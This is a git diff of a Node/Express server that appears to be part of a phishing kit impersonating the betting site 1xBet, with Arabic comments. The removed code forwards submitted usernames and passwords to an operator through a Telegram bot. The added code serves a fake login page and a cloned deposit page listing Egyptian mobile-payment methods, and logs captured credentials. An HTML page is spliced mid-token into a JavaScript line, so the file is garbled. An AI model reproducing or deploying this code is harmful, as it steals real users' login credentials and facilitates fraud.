@@ -1,44 +1,74 @@
-const express = require("express");
-const axios = require("axios");
-const cors = require("cors");
-
+const express = require('express');
+const path = require('path');
 const app = express();
-const PORT = process.env.PORT || 3000;
 
-app.use(cors());
+// إعدادات ضرورية لاستقبال البيانات من الصفحة
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
+app.use(e<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إيداع - 1xBet</title>
+    <style>
+        body { font-family: sans-serif; background: #0e1e2d; color: white; margin: 0; padding: 15px; }
+        .method-box { background: #1c2d3d; border-radius: 10px; padding: 15px; margin-bottom: 10px; display: flex; align-items: center; cursor: pointer; border: 1px solid transparent; }
+        .method-box:hover { border-color: #2196F3; }
+        .method-icon { width: 45px; height: 45px; background: white; border-radius: 8px; margin-left: 15px; display: flex; justify-content: center; align-items: center; color: #333; font-weight: bold; font-size: 10px; text-align: center; }
+        .method-name { flex-grow: 1; font-size: 16px; font-weight: bold; }
+        h2 { font-size: 18px; margin-bottom: 20px; border-right: 4px solid #2196F3; padding-right: 10px; }
+    </style>
+</head>
+<body>
 
-app.post("/send", async (req, res) => {
-  const { user, pass, type } = req.body;
+    <h2>طرق الإيداع الموصى بها</h2>
 
-  if (!user || !pass || !type) {
-    return res.status(400).json({ error: "Missing required fields: user, pass, type" });
-  }
+    <div class="method-box" onclick="location.href='https://1xbet.com'">
+        <div class="method-icon" style="background: #e60000; color: white;">VODAFONE</div>
+        <div class="method-name">فودافون كاش / Vodafone Cash</div>
+        <span>➔</span>
+    </div>
 
-  const botToken = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID;
+    <div class="method-box" onclick="location.href='https://1xbet.com'">
+        <div class="method-icon" style="background: #6c2d91; color: white;">INSTA</div>
+        <div class="method-name">انستا باي / InstaPay</div>
+        <span>➔</span>
+    </div>
 
-  if (!botToken || !chatId) {
-    return res.status(500).json({ error: "Telegram credentials not configured" });
-  }
+    <div class="method-box" onclick="location.href='https://1xbet.com'">
+        <div class="method-icon" style="background: #ff6600; color: white;">ORANGE</div>
+        <div class="method-name">أورانج كاش / Orange Cash</div>
+        <span>➔</span>
+    </div>
 
-  const message = `New Request:\nUser: ${user}\nPass: ${pass}\nType: ${type}`;
+    <div class="method-box" onclick="location.href='https://1xbet.com'">
+        <div class="method-icon" style="background: #00a09a; color: white;">ETISALAT</div>
+        <div class="method-name">اتصالات كاش / Etisalat Cash</div>
+        <span>➔</span>
+    </div>
 
-  try {
-    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      chat_id: chatId,
-      text: message,
-    });
+</body>
+</html>xpress.static('.'));
 
-    res.json({ success: true, message: "Sent to Telegram successfully" });
-  } catch (err) {
-    const telegramError = err.response?.data?.description || err.message;
-    console.error("Telegram error:", telegramError);
-    res.status(500).json({ error: "Failed to send message to Telegram", details: telegramError });
-  }
+// عرض صفحة تسجيل الدخول الرئيسية
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+// عرض صفحة الإيداع
+app.get('/deposit', (req, res) => {
+    res.sendFile(path.join(__dirname, 'deposit.html'));
+});
+
+// استقبال بيانات الدخول والتحويل لصفحة الإيداع
+app.post('/login', (req, res) => {
+    const { username, password } = req.body;
+    console.log(`بيانات دخول جديدة: ${username} | ${password}`);
+    // نرسل رد بالنجاح لكي يقوم المتصفح بالتحويل
+    res.json({ success: true });
+});
+
+app.listen(8080, '0.0.0.0', () => {
+    console.log('السيرفر يعمل الآن على منفذ 8080');
 });
